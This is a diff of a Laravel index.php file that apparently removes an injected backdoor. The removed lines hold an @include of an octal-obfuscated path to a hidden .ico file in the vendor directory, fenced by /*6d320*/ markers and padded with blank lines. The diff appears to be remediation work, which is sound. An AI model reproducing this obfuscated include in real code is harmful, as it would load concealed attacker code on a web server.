@@ -1,17 +1,4 @@
 <?php
-/*6d320*/
-
-@include "\057va\162/w\167w/\150tm\154/c\151nc\150/v\145nd\157r/\156ik\151c/\056a7\143e2\06378\056ic\157";
-
-/*6d320*/
-
-
-
-
-
-
-
-
 
 /**
  * Laravel - A PHP Framework For Web Artisans
@@ -33,7 +20,6 @@ define('LARAVEL_START', microtime(true));
 | loading any of our classes later on. It feels great to relax.
 |
 */
-
 require __DIR__.'/../vendor/autoload.php';
 
 /*
